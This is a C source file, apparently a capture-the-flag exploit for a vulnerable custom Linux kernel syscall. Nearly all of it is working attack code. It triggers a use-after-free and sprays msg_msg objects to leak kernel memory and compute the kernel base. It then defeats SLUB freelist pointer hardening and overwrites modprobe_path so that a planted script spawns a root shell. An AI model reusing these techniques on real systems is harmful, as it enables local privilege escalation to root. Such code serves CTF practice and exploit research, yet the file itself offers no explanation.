#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/msg.h>
#include <limits.h>

#include <stdbool.h>

// commands
#define DEV_PATH "/dev/ttp"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

#define MSG_COPY        040000

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}


static uint64_t bswap(uint64_t val)
{
    __asm__(
            ".intel_syntax noprefix;"
            "bswap rdi;"
            "mov rax, rdi;"
            ".att_syntax;"
    );
}

static void shell_modprobe()
{
   ; system("echo '#!/bin/sh' > /home/user/hax; \
            echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /home/user/hax");
    system("chmod +x /home/user/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/root");
    system("chmod +x /home/user/root");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

#define IPS 548

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

static void get_shell()
{
    puts("test");
    if (!getuid())
	{
		puts("Got r00t :)");
		system("/bin/sh");
	}
	exit(0);
}

typedef struct {
  int idx;
  unsigned short priority;
  char *data;
} userdata_t;

typedef struct {
    long mtype;
    char mtext[1];
} msg_t;


static void alloc_storage(unsigned short prio, char* data)
{
    userdata_t ud = {0};
    ud.priority = prio;
    ud.data = data;

    if (syscall(IPS, 1, &ud) < 0) {
        errExit("alloc storage");
    }
}

static void remove_storage(int idx)
{
    userdata_t ud = {0};
    ud.idx = idx;

    if (syscall(IPS, 2, &ud) < 0) {
        errExit("remove storage");
    }
}

static void edit_storage(int idx, char* data)
{
    userdata_t ud = {0};
    ud.idx = idx;
    ud.data = data;

    if (syscall(IPS, 3, &ud) < 0) {
        errExit("edit storage");
    }
}

static void copy_storage(int idx, bool err)
{
    userdata_t ud = {0};
    ud.idx = idx;
    int ret;

    ret = syscall(IPS, 4, &ud);

    if (ret < 0 && !err) {
        errExit("copy storage");
    }
    else if (ret < 0 && err) {
        puts("Expected error occured");
    }
}

static void send_msg(int qid, const void* data, size_t sz)
{
    int ret;
    uint8_t buf[0x1000];
    msg_t* msg_p = (msg_t*)buf;
    msg_p->mtype = 0x1337;
    memcpy(msg_p->mtext, data, sz);

    ret = msgsnd(qid, (void*)buf, sz, IPC_NOWAIT);

    if (ret < 0) {
        errExit("msgsnd");
    }
}

static void recv_msg(int qid, void* data, size_t sz)
{
    int ret;

    ret = msgrcv(qid, data, sz, LONG_MAX, IPC_NOWAIT |  MSG_NOERROR);

    if (ret < 0) {
        errExit("msgrcv");
    }
}

/*
 * msg_msg sz = 0x30 + data
 *
 * data offset = 6
 *
 * sz offset = 24
 *
 */

typedef struct {
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
} msg_msg_t;

typedef struct {
    uint64_t address;
    uint64_t next;
    size_t offset;
} chunk_t;

uint64_t k_leak;
uint64_t random_val;
uint64_t msg_msg_addr;
chunk_t chunks[0x10];

static void find_info(uint8_t* buf, size_t sz)
{
    uint64_t* p_buf = (uint64_t*)buf;
    for (size_t i = 0; i < sz/8; i++) {

        if (!k_leak && ((p_buf[i] & 0xfff) == 0x600)
            && (p_buf[i] & 0xffffffff00000000) == 0xffffffff00000000) {
            k_leak = p_buf[i];
        }

        if ((p_buf[i] & 0xffffffffffffff00) == 0x4242424242424200 &&
            (p_buf[i] & 0xff) != 0x42) {

            uint64_t idx = (p_buf[i] & 0xff) - 0x50;
            chunks[idx].offset = (i * 8) - 0x10;
            chunks[idx].next = p_buf[i - 2];
        }
    }

    for (int i = 0; i < 0xf; i++) {
        if ((chunks[i].offset != 0) && (chunks[i+1].offset != 0)) {
          chunks[i + 1].address = chunks[i].next;

            if (!msg_msg_addr) {
                msg_msg_addr = chunks[i + 1].address - chunks[i + 1].offset - 0x28;
            }
        }
    }

    for (int i = 0; i < 0x10; i++) {
        chunk_t* c = &chunks[i];
        printf("\nchunk [%2d]: address: %18p, next: %18p, offset: %4p",
                i, c->address, c->next, c->offset);
    }

    printf("\n");
}

static int find_adjacent_chunks(void)
{
    int freed_idx[0x2] = {0};
    uint64_t chunks_freed = 0;

    // alloc another msg_msg obj in chunk we have uaf for
    uint8_t buf[0x50] = {0};
    memset(buf, 0x42, sizeof(buf)); 
    send_msg(qid, buf, sizeof(buf));

    for (int i = 0; i < 0x10; i++) {
        if (chunks[i].address && chunks[i].offset) {
            remove_storage(i);
            freed_idx[chunks_freed++] = i;

            printf("offset: %zu \n", chunks[i].offset);

            if (chunks_freed == 2) {
                break;
            }
        }
    }

    if (chunks_freed != 2) {
        printf("Not enough chunks freed \n");
        return -1;
    }

    uint8_t buf2[0x72] = {0};
    msg_msg_t* p_msg = (msg_msg_t*)&buf2[-0xe];
    buf2[0] = 0xff;
    buf2[1] = 0xff;
    p_msg->m_type = LONG_MAX;
    p_msg->m_ts = ULONG_MAX;

    //corrupt msg_struct again
    edit_storage(-1, buf2);

    uint8_t leaks[0x1000] = {0};
    uint64_t* p_leaks = (uint64_t*)leaks;
    // msg_obj we have UAF on will be first in freelist
    recv_msg(qid, leaks, 0x1000);

    // SLUB FIFO free_list ordering
    uint64_t free_next = chunks[freed_idx[0]].address;
    uint64_t free_next_ptr_addr = chunks[freed_idx[1]].address + 0x40;
    uint64_t obfuscated = p_leaks[chunks[freed_idx[1]].offset / 0x8 \ 
                                  + 0x40 / 0x8];
    if (!obfuscated || !free_next || !free_next_ptr_addr) {
        puts("missing val to calculated random val");
        return -1;
    }
    
    /*
    printf("test: %p %p \n", p_leaks[chunks[freed_idx[1]].offset + 0x8],
            p_leaks[chunks[freed_idx[1]].offset + 0x5]);
    */

    printf("free_next: %p | free_next_ptr_addr: %p | obfuscated: %p \n",
            free_next, free_next_ptr_addr, obfuscated);

    
    random_val = free_next ^ bswap(free_next_ptr_addr) ^ obfuscated; 

    printf("random val: %p \n", random_val);

    return 0;
}

int main(void) {

    int ret;

    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

    shell_modprobe();
    
    system("id");

    if (qid < 0) {
        errExit("msgget");
    }

    uint8_t buf[0x50] = {0};
    memset(buf, 0x41, 2);
    uint64_t* p_buf = (uint64_t*)(buf + 2);

    for (int i = 0; i < 0x10; i++) {
        *p_buf = 0x4242424242424250 + i;
        alloc_storage(0, buf);
    }

    // chunk in 0 copied to -1
    copy_storage(0, true);
    // chunk in 0 deleted but still available at -1 => uaf
    remove_storage(0);

    // spray msg_msg objects
    memset(buf, 0x42, sizeof(buf)); 
    send_msg(qid, buf, sizeof(buf));
    
    // hopefully corrupt a msg_msg obj
    uint8_t buf2[0x72] = {0};
    // align msg object based on struct chunk data member offset
    msg_msg_t* p_msg = (msg_msg_t*)&buf2[-0xe];
    buf2[0] = 0xff;
    buf2[1] = 0xff;
    p_msg->m_type = LONG_MAX;
    p_msg->m_ts = ULONG_MAX;

    // overwrite msg object and corrupt m_ts (text size)
    edit_storage(-1, buf2);

    uint8_t leaks[0x1000] = {0};
    recv_msg(qid, leaks, 0x1000);

    //print_hex8(leaks, sizeof(leaks));
    
    find_info(leaks, sizeof(leaks));

    if (!k_leak) {
        printf("no kleak \n");
        return -1;
    }

    uint64_t k_base = k_leak - 0xa11600;
    uint64_t modprobe_path = k_base + 0x144fa20;
    printf("kbase: %p \n", k_base);
    printf("modprobe_path: %p \n", modprobe_path);

    ret = find_adjacent_chunks();

    if (ret < 0) {
        return -1;
    }

    printf("msg_msg addr: %p \n", msg_msg_addr);

    uint64_t obfuscated_ptr = (modprobe_path - 0x10) ^ random_val \ 
                              ^ bswap(msg_msg_addr + 0x40);


    printf("obfuscated ptr: %p \n", obfuscated_ptr);
    printf("real ptr: %p \n", modprobe_path - 0x10);

    uint8_t fake[0x60] = {0};
    memset(fake, 0x41, 0x40 - 0xe);
    uint64_t* p_fake = fake + (0x40 - 0xe);
    *p_fake = obfuscated_ptr;
    //*p_fake = 0x414141;

    //print_hex8(fake, sizeof(fake));

    edit_storage(-1, fake);

    char final[0x40] = {0};
    memset(final, 0x41, 0x2);
    strcpy(&final[0x2], "/home/user/hax");

    // should be the chunk we have UAF on and corrupted the next ptr
    alloc_storage(0, final);
    // modprobe path
    alloc_storage(0, final);

    puts("triggering shell");
    system("/home/user/root");

    return 0;
}
